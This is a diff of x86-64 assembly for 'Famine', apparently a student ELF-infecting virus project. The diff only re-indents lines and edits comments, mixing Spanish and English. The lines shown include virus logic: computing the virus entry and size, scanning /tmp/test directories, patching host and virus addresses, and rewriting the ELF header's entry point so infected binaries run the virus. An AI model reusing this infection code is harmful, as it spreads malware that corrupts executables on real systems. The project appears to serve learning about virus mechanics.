@@ -12,24 +12,24 @@ section .text
         syscall
 
     _start:
-    PUSH_ALL
-    push rsp
-    ; this trick allows us to access Famine members using the VAR macro
-    mov rbp, rsp
-    sub rbp, Famine_size            ; allocate Famine struct on stack
+        PUSH_ALL
+        push rsp
+        ; this trick allows us to access Famine members using the VAR macro
+        mov rbp, rsp
+        sub rbp, Famine_size            ; allocate Famine struct on stack
 
-    ; load virus entry
-    lea rax, _start
-    mov VAR(Famine.virus_entry), rax
+        ; load virus entry
+        lea rax, _start
+        mov VAR(Famine.virus_entry), rax
 
-    ; load virus size
-    lea rax, _start
-    lea rbx, _finish
-    sub rbx, rax
-    mov dword VAR(Famine.virus_size), ebx
+        ; load virus size
+        lea rax, _start
+        lea rbx, _finish
+        sub rbx, rax
+        mov dword VAR(Famine.virus_size), ebx
 
-    ;load dirs
-    lea rdi, [dirs]
+        ;load dirs
+        lea rdi, [dirs]
 
     .open_dir:
 
@@ -311,15 +311,15 @@ section .text
 
                    pop rdi                       
 
-                   ; 1. Parchear host_entry en el mmap
+                   ; Patch host_entry en el mmap
                    mov rax, VAR(Famine.original_entry)
                    mov [rdi + (host_entry - _start)], rax
 
-                   ; 2. Parchear virus_vaddr en el mmap
+                   ; Patch virus_vaddr en el mmap
                    mov rax, VAR(Famine.new_entry)
                    mov [rdi + (virus_vaddr - _start)], rax
 
-                   ; 3. Cambiar e_entry en el ELF Header
+                   ; Cambiar e_entry en el ELF Header
                    mov rax, VAR(Famine.mmap_ptr)
                    mov rbx, VAR(Famine.new_entry)
                    mov [rax + Elf64_Ehdr.e_entry], rbx
@@ -378,9 +378,10 @@ section .text
             pop rsp
             mov rax, SC_EXIT
             syscall
-    dirs db         "/tmp/test",0,"/tmp/test2",0,0
-    Traza db         "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
-    hello db            "[+] Hello",10,0  ;11
-    host_entry  dq   _host
-    virus_vaddr dq   _start  
+    
+        dirs db         "/tmp/test",0,"/tmp/test2",0,0
+        Traza db         "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
+        hello db            "[+] Hello",10,0  ;11
+        host_entry  dq   _host
+        virus_vaddr dq   _start  
     _finish:
